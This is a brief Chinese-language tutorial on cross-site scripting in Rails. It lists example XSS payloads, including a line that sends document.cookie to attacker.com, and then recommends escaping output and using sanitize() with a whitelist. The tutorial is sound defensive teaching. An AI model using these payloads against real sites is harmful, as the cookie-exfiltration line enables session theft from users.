# XSS 是什麼
XSS - Cross-Site Scripting 是指在輸入資料的欄位輸入惡意程式碼，使資料外洩或惡作劇跳出視窗，如下

```javascript
<script>alert('HACK YOU!');</script>
<img src=javascript:alert('HACK YOU!')>
<table background="javascript:alert('HACK YOU!')">
<script>document.write(document.cookie);</script>
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

要解決這個問題最基本的方法就是用 escapeHTML() 或 h() 處理並顯示使用者產生的文字  

但有時候我們必須讓使用者可以輸入 HTML 怎麼辦?

那就使用 Rails 提供的 sanitize() 方法以及建立白名單來過濾輸入的 HTML

詳細使用參照 [here](http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize)